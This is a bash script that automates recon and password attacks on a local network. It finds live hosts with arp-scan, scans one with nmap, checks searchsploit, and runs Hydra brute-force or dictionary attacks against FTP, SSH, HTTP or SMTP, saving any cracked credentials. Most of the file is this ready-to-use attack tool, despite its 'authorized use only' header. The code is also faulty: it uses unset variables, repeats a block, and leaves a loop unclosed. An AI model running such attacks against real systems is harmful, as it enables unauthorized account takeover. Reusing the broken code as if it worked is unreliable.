#!/bin/bash

# --------------------------------------------------------------------
# Author      : Nadav Gabay
# Date        : 2025-05-11
# Description : Automated brute-force script using Hydra.
#               This script is designed to streamline and simplify
#               brute-force attacks during penetration testing,
#               red teaming, or CTF challenges.
#               It automatically adjusts Hydra commands based
#               on the target service and user input.

# Note        : For educational purposes and authorized environments only.
#               Use responsibly and with permission.
# --------------------------------------------------------------------


# Reset color
RESET='\e[0m'
# Colors
WHITE='\e[97m'
CYAN='\e[96m'
YELLOW='\e[93m'
GREEN='\e[92m'
RED='\e[91m'

if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}You must run this script as root. Please use 'sudo' and try again.${RESET}"
    exit 1
fi

if ! command -v figlet >/dev/null 2>&1; then
    if command -v sudo >/dev/null 2>&1; then
        sudo apt-get update && sudo apt-get install figlet -y
    else
        echo -e "${RED}Error: 'figlet' is not installed and 'sudo' is unavailable. Please install 'figlet' manually.${RESET}"
        exit 1
    fi
fi

figlet WELCOME

required_tools=(nmap arp-scan hydra searchsploit msfvenom msfconsole cupp ipcalc)
echo -e "${WHITE}It checks and installs required tools, identifies live hosts, scans open ports,${RESET}"
echo -e "${WHITE}searches for known vulnerabilities, and performs various attacks.${RESET}"
echo -e "${WHITE}A detailed report is generated with findings and valid credentials if discovered.${RESET}"

required_tools=(nmap arp-scan hydra searchsploit ipcalc msfvenom msfconsole cupp)
missing_tools=()
for tool in "${required_tools[@]}"; do
    if ! command -v "$tool" &>/dev/null; then
        missing_tools+=("$tool")
    fi
done

if [ ${#missing_tools[@]} -gt 0 ]; then
    echo -e "${RED}[!] The following tools are missing: ${missing_tools[*]}${RESET}"
    while true; do
        read -p "[?] Do you want to install them? (y/n): " answer
        if [[ "$answer" =~ ^[Yy]$ ]]; then
            break
        elif [[ "$answer" =~ ^[Nn]$ ]]; then
            echo -e "${WHITE}Exiting script. Bye :)${RESET}"
            exit 1
        else
            echo -e "${RED}Invalid answer. Please respond with 'y' or 'n'.${RESET}"
        fi
    done
    for tool in "${missing_tools[@]}"; do
        echo -e "${WHITE}[+] Installing $tool...${RESET}"
        sudo apt-get install -y "$tool"
    done
else
    echo -e "${WHITE}All required tools are already installed.${RESET}"
fi

while true; do
    echo -e "${CYAN}Where would you like to create the work directory?${RESET}"
    echo -e "${WHITE}1) Under /home${RESET}"
    echo -e "${WHITE}2) Under /temp${RESET}"
    read -p "Choose 1 or 2: " choice
    if [ "$choice" -eq 1 ]; then
        dir="$HOME/vulner"
        break
    elif [ "$choice" -eq 2 ]; then
        dir="/temp/vulner"
        break
    else
        echo -e "${RED}Invalid choice, please choose 1 or 2.${RESET}"
    fi
done

mkdir -p "$dir"
echo -e "${WHITE}The work directory has been created at $dir${RESET}" >>scan_log.txt

my_ip=$(hostname -I | awk '{print $1}')
echo -e "${WHITE}Current IP address: ${YELLOW}$my_ip${RESET}"
network_range=$(ipcalc -n "$my_ip" | grep Network | awk '{print $2}')
echo -e "${WHITE}Network range: ${YELLOW}$network_range${RESET}"
echo "$(date) - Network range: $network_range" >> scan_log.txt

echo -e "${WHITE}Scanning live hosts on the network...${RESET}"
live_hosts=$(arp-scan --localnet --interface eth0 -q | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u)
if [ -z "$live_hosts" ]; then
    echo -e "${RED}No live hosts found.${RESET}"
    echo "$(date) - No live hosts found." >> scan_log.txt
    exit 1
fi

filtered_hosts=()
for ip in $live_hosts; do
    if [[ "$ip" != "$my_ip" && "$ip" != "192.168.10.254" ]]; then
        filtered_hosts+=("$ip")
    fi
done

echo -e "${WHITE}Filtered live hosts:${RESET}"
echo -e "${YELLOW}${filtered_hosts[@]}${RESET}"
echo "$(date) - Live hosts: ${filtered_hosts[@]}" >> scan_log.txt

echo -e "${CYAN}Please select the number of the host to scan with Nmap (0 to exit):${RESET}"
PS3="Please select a host: "
select selected_ip in "${filtered_hosts[@]}"; do
    if [[ -n "$selected_ip" ]]; then
        echo -e "${WHITE}You chose: ${YELLOW}$selected_ip${RESET}"
        break
    elif [[ "$selected_ip" == "" && "$REPLY" == "0" ]]; then
        echo -e "${WHITE}Exiting the script.${RESET}"
        exit 0
    else
        echo -e "${RED}Invalid choice, please select a valid number.${RESET}"
    fi
done

echo -e "${WHITE}Scanning ${YELLOW}$selected_ip${RESET} with Nmap...${RESET}"
nmap_output_dir="$dir/$selected_ip"
mkdir -p "$nmap_output_dir"
echo -e "${CYAN}Nmap Scan Results for ${YELLOW}$selected_ip${RESET}:${RESET}"
nmap -sV -p 1-1000 --open -oA "$nmap_output_dir/nmap" -oX "$nmap_output_dir/nmap.xml" "$selected_ip" 

if [[ $? -ne 0 ]]; then
    echo -e "${RED}Nmap scan failed for $selected_ip. Retrying...${RESET}"
    echo "$(date) - Nmap scan failed for $selected_ip." >> scan_log.txt
    nmap -sV -p 1-1000 --open -oA "$nmap_output_dir/nmap" -oX "$nmap_output_dir/nmap.xml" "$selected_ip"
    if [[ $? -ne 0 ]]; then
        echo -e "${RED}Nmap scan failed again for $selected_ip.${RESET}"
        echo "$(date) - Nmap scan failed again for $selected_ip." >> scan_log.txt
    fi
fi

echo -e "${WHITE}Nmap scan completed for ${YELLOW}$selected_ip${RESET}.${RESET}"
if [ -s "$nmap_output_dir/nmap.nmap" ]; then
    echo -e "${WHITE}Full Nmap results saved to ${YELLOW}$nmap_output_dir/nmap.nmap${RESET}"
else
    echo -e "${RED}No open ports found in Nmap scan.${RESET}"
fi

echo -e "${WHITE}Running searchsploit on Nmap results...${RESET}"
searchsploit --nmap "$nmap_output_dir/nmap.xml" > "$nmap_output_dir/searchsploit_results.txt" 2>/dev/null
echo -e "${CYAN}Searchsploit Results for ${YELLOW}$selected_ip${RESET}:${RESET}"
if [ -s "$nmap_output_dir/searchsploit_results.txt" ]; then
    cat "$nmap_output_dir/searchsploit_results.txt" | grep -v "Exploit DB" | grep -v "No Results" | awk '{print " - " $0}'
    echo -e "${WHITE}Results saved to ${YELLOW}$nmap_output_dir/searchsploit_results.txt${RESET}"
else
    echo -e "${RED}No vulnerabilities found by searchsploit.${RESET}"
fi



while true; do
    echo -e "${CYAN}Choose the service to attack:${RESET}"
    echo -e "${WHITE}1) FTP${RESET}"
    echo -e "${WHITE}2) SSH${RESET}"
    echo -e "${WHITE}3) HTTP${RESET}"
    echo -e "${WHITE}4) SMTP${RESET}"
    echo -e "${WHITE}0) Exit${RESET}"
    read -p "Enter your choice: " service_choice
    case "$service_choice" in
        1)
            service="ftp"
            break
            ;;
        2)
            service="ssh"
            break
            ;;
        3)
            service="http"
            break
            ;;
        4)
            service="smtp"
            break
            ;;
        0)
            echo -e "${WHITE}Exiting the script.${RESET}"
            exit 0
            ;;
        *)
            echo -e "${RED}Invalid choice. Please select a valid option.${RESET}"
            ;;
    esac
done

while true; do
    echo -e "${CYAN}Choose an attack type:${RESET}"
    echo -e "${WHITE}1) Brute Force Attack${RESET}"
    echo -e "${WHITE}2) Dictionary Attack${RESET}"
    echo -e "${WHITE}0) Exit${RESET}"
    read -p "Enter your choice: " main_choice
    case "$main_choice" in
        1)
            echo -e "${WHITE}Brute Force Attack selected.${RESET}"
            echo -e "${WHITE}Enter full path to the usernames file:${RESET}"
            read -p "enter the ful path to the username list file: " username_file
            echo -e "${WHITE}Running brute force attack using Hydra...${RESET}"
            hydra -L "$username_file" -P "$password_file" "$selected_ip" "$service" -f | tee vulner/hydra_bruteforce_result.txt
            echo -e "${WHITE}Brute force attack finished. Results:${RESET}"
            cat vulner/hydra_bruteforce_result.txt
            found_user=$(grep "login:" vulner/hydra_bruteforce_result.txt | awk '{print $5}')
            found_pass=$(grep "password:" vulner/hydra_bruteforce_result.txt | awk '{print $5}')
            if [ -n "$found_user" ] && [ -n "$found_pass" ]; then
                echo -e "${GREEN}=== Found Credentials ===${RESET}"
                echo -e "${GREEN}Username: $found_user${RESET}"
                echo -e "${GREEN}Password: $found_pass${RESET}"
                echo -e "${GREEN}=======================${RESET}"
                echo "Username: $found_user" > "$nmap_output_dir/credentials.txt"
                echo "Password: $found_pass" >> "$nmap_output_dir/credentials.txt"
                echo -e "${WHITE}Credentials saved to $nmap_output_dir/credentials.txt${RESET}"
            else
                echo -e "${RED}No valid credentials found.${RESET}"
            fi
            break
            ;;
        2)
            while true; do
                echo -e "${CYAN}Dictionary Attack Options:${RESET}"
                echo -e "${WHITE}1) NSR Attack (-e nsr)${RESET}"
                echo -e "${WHITE}2) Custom usernames and passwords lists${RESET}"
                echo -e "${WHITE}3) Random password generation attack${RESET}"
                echo -e "${WHITE}0) Go back${RESET}"
                read -p "Enter your choice (0-3): " dict_choice
                case "$dict_choice" in
                    1)
                        echo -e "${WHITE}NSR Attack selected.${RESET}"
                        echo -e "${WHITE}Enter full path to the usernames file:${RESET}"
                        read username_file
                        hydra -L "$username_file" -e nsr "$selected_ip" "$service" -f | tee vulner/hydra_dict_nsr_result.txt
                        echo -e "${WHITE}NSR attack finished. Results:${RESET}"
                        found_user=$(grep "login:" vulner/hydra_dict_nsr_result.txt | awk '{print $5}')
                        found_pass=$(grep "password:" vulner/hydra_dict_nsr_result.txt | awk '{print $5}')
                        if [ -n "$found_user" ] && [ -n "$found_pass" ]; then
                            echo -e "${GREEN}=== Found Credentials ===${RESET}"
                            echo -e "${GREEN}Username: $found_user${RESET}"
                            echo -e "${GREEN}Password: $found_pass${RESET}"
                            echo -e "${GREEN}=======================${RESET}"
                            echo "Username: $found_user" > "$nmap_output_dir/credentials.txt"
                            echo "Password: $found_pass" >> "$nmap_output_dir/credentials.txt"
                            echo -e "${WHITE}Credentials saved to $nmap_output_dir/credentials.txt${RESET}"
                        else
                            echo -e "${RED}No valid credentials found.${RESET}"
                        fi
                        break 2
                        ;;
                    2)
                        echo -e "${WHITE}Custom attack selected.${RESET}"
                        echo -e "${WHITE}Enter full path to the usernames file:${RESET}"
                        read username_file
                        echo -e "${WHITE}Enter full path to the passwords file:${RESET}"
                        read password_file
                        hydra -L "$username_file" -P "$password_file" "$selected_ip" "$service" -f | tee vulner/hydra_dict_custom_result.txt
                        echo -e "${WHITE}Custom attack finished. Results:${RESET}"
                        found_user=$(grep "login:" vulner/hydra_dict_custom_result.txt | awk '{print $5}')
                        found_pass=$(grep "password:" vulner/hydra_dict_custom_result.txt | awk '{print $5}')
                        if [ -n "$found_user" ] && [ -n "$found_pass" ]; then
                            echo -e "${GREEN}=== Found Credentials ===${RESET}"
                            echo -e "${GREEN}Username: $found_user${RESET}"
                            echo -e "${GREEN}Password: $found_pass${RESET}"
                            echo -e "${GREEN}=======================${RESET}"
                            echo "Username: $found_user" > "$nmap_output_dir/credentials.txt"
                            echo "Password: $found_pass" >> "$nmap_output_dir/credentials.txt"
                            echo -e "${WHITE}Credentials saved to $nmap_output_dir/credentials.txt${RESET}"
                        else
                            echo -e "${RED}No valid credentials found.${RESET}"
                        fi
                        break 2
                        ;;
                    3)
                        echo -e "${WHITE}Random password generation attack selected.${RESET}"
                        while true; do
                            read -p "Enter number of random passwords to generate: " num_random
                        random_dir="$dir/random"
                        mkdir -p "$random_dir"
                        generated_pass_file="$random_dir/random_passwords.txt"
                        > "$generated_pass_file"
                        for i in $(seq 1 "$num_random"); do
                            password=$(openssl rand -base64 "$password_length" | tr -dc '0-9A-Za-z' | head -c "$password_length")
                            echo "$password" >> "$generated_pass_file"
                        done
                        mkdir -p "$random_dir"
                        generated_pass_file="$random_dir/random_passwords.txt"
                        > "$generated_pass_file"
                        for i in $(seq 1 "$num_random"); do
                            password=$(tr -dc '0-9A-Za-z' </dev/urandom | head -c "$password_length")
                            echo "$password" >> "$generated_pass_file"
                        done
                        echo -e "${WHITE}Random passwords generated and saved to: $generated_pass_file${RESET}"
                        echo -e "${WHITE}Enter full path to the usernames file:${RESET}"
                        read username_file
                        hydra -L "$username_file" -P "$generated_pass_file" "$selected_ip" "$service" -f | tee vulner/hydra_dict_random_result.txt
                        echo -e "${WHITE}Random attack finished. Results:${RESET}"
                        found_user=$(grep "login:" vulner/hydra_dict_random_result.txt | awk '{print $5}')
                        found_pass=$(grep "password:" vulner/hydra_dict_random_result.txt | awk '{print $5}')
                        if [ -n "$found_user" ] && [ -n "$found_pass" ]; then
                            echo -e "${GREEN}=== Found Credentials ===${RESET}"
                            echo -e "${GREEN}Username: $found_user${RESET}"
                            echo -e "${GREEN}Password: $found_pass${RESET}"
                            echo -e "${GREEN}=======================${RESET}"
                            echo "Username: $found_user" > "$nmap_output_dir/credentials.txt"
                            echo "Password: $found_pass" >> "$nmap_output_dir/credentials.txt"
                            echo -e "${WHITE}Credentials saved to $nmap_output_dir/credentials.txt${RESET}"
                        else
                            echo -e "${RED}No valid credentials found.${RESET}"
                        fi
                        break 2
                        ;;
                    0)
                        echo -e "${WHITE}Returning to main menu.${RESET}"
                        break
                        ;;
                    *)
                        echo -e "${RED}Invalid choice. Please select a valid option.${RESET}"
                        ;;
                esac
            done
            ;;
        0)
            echo -e "${WHITE}Exiting the script.${RESET}"
            exit 0
            ;;
        *)
            echo -e "${RED}Invalid choice. Please select a valid option.${RESET}"
            ;;
    esac
done
